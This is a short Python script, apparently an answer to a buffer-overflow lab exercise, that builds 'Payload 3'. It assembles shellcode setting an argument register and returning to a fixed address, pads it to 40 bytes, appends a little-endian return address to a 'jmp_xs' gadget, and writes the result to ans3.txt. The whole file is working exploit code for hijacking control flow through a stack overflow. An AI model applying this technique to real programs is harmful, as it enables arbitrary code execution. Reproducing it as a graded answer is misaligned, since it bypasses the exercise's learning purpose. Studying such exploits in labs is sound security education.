import struct

# mov rdi, 0x72 -> 48 c7 c7 72 00 00 00
# push 0x401216 -> 68 16 12 40 00
# ret           -> c3
shellcode = b"\x48\xc7\xc7\x72\x00\x00\x00\x68\x16\x12\x40\x00\xc3"

padding_size = 40 - len(shellcode)
padding = shellcode + (b"A" * padding_size)

jmp_xs_addr = struct.pack("<Q", 0x401334)

payload = padding + jmp_xs_addr

with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"Payload 3 已生成。Shellcode长度: {len(shellcode)} 字节")